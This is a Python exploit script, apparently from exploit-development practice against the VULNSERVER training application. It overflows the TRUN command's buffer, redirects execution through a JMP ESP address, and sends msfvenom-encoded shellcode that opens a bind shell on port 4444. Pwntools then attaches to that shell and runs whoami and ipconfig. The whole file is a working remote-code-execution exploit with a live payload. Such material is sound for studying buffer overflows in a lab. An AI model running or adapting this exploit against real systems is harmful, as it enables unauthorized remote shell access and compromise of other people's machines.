#!/usr/bin/python
import socket
import os
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host= sys.argv[1]
port=9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)

A = "A" * 2006

# 625011AF   FFE4             JMP ESP
EIP = p32(0x625011AF)

# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00" EXITFUNC=thread -f c
shellcode = (
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\xd9\xe5\xb8\x4e\xb2\x98\x69\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
        "\x53\x31\x43\x17\x03\x43\x17\x83\xa5\x4e\x7a\x9c\xc5\x47\xf9"
        "\x5f\x35\x98\x9e\xd6\xd0\xa9\x9e\x8d\x91\x9a\x2e\xc5\xf7\x16"
        "\xc4\x8b\xe3\xad\xa8\x03\x04\x05\x06\x72\x2b\x96\x3b\x46\x2a"
        "\x14\x46\x9b\x8c\x25\x89\xee\xcd\x62\xf4\x03\x9f\x3b\x72\xb1"
        "\x0f\x4f\xce\x0a\xa4\x03\xde\x0a\x59\xd3\xe1\x3b\xcc\x6f\xb8"
        "\x9b\xef\xbc\xb0\x95\xf7\xa1\xfd\x6c\x8c\x12\x89\x6e\x44\x6b"
        "\x72\xdc\xa9\x43\x81\x1c\xee\x64\x7a\x6b\x06\x97\x07\x6c\xdd"
        "\xe5\xd3\xf9\xc5\x4e\x97\x5a\x21\x6e\x74\x3c\xa2\x7c\x31\x4a"
        "\xec\x60\xc4\x9f\x87\x9d\x4d\x1e\x47\x14\x15\x05\x43\x7c\xcd"
        "\x24\xd2\xd8\xa0\x59\x04\x83\x1d\xfc\x4f\x2e\x49\x8d\x12\x27"
        "\xbe\xbc\xac\xb7\xa8\xb7\xdf\x85\x77\x6c\x77\xa6\xf0\xaa\x80"
        "\xc9\x2a\x0a\x1e\x34\xd5\x6b\x37\xf3\x81\x3b\x2f\xd2\xa9\xd7"
        "\xaf\xdb\x7f\x4d\xa7\x7a\xd0\x70\x4a\x3c\x80\x34\xe4\xd5\xca"
        "\xba\xdb\xc6\xf4\x10\x74\x6e\x09\x9b\x6b\x33\x84\x7d\xe1\xdb"
        "\xc0\xd6\x9d\x19\x37\xef\x3a\x61\x1d\x47\xac\x2a\x77\x50\xd3"
        "\xaa\x5d\xf6\x43\x21\xb2\xc2\x72\x36\x9f\x62\xe3\xa1\x55\xe3"
        "\x46\x53\x69\x2e\x30\xf0\xf8\xb5\xc0\x7f\xe1\x61\x97\x28\xd7"
        "\x7b\x7d\xc5\x4e\xd2\x63\x14\x16\x1d\x27\xc3\xeb\xa0\xa6\x86"
        "\x50\x87\xb8\x5e\x58\x83\xec\x0e\x0f\x5d\x5a\xe9\xf9\x2f\x34"
        "\xa3\x56\xe6\xd0\x32\x95\x39\xa6\x3a\xf0\xcf\x46\x8a\xad\x89"
        "\x79\x23\x3a\x1e\x02\x59\xda\xe1\xd9\xd9\xfa\x03\xcb\x17\x93"
        "\x9d\x9e\x95\xfe\x1d\x75\xd9\x06\x9e\x7f\xa2\xfc\xbe\x0a\xa7"
        "\xb9\x78\xe7\xd5\xd2\xec\x07\x49\xd2\x24"
        )

C = shellcode + "C" * (5050 - len(A) - len(EIP) - len(shellcode))

buffer = "TRUN ." + A + EIP + C

print "[+] Sending exploit buffer"
s.send(buffer)

print "[+] Waiting for shell"
time.sleep(2)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
